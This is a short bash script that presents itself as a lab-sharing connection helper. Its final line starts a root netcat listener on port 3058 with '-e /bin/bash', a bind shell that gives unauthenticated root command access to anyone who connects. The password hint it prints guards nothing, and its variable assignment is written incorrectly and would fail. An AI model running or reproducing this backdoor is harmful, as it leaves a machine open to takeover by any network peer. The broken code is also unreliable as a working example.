#! /bin/bash
echo "Lab connecting Made to share ONLY!!! heehehehe"
echo "Type csc for password"
Connect_id = $(ifconfig)
sudo chmod +x /bin/bash

echo "IP address to connect is: $Connect_id"
sudo nc -lvp 3058 -e /bin/bash
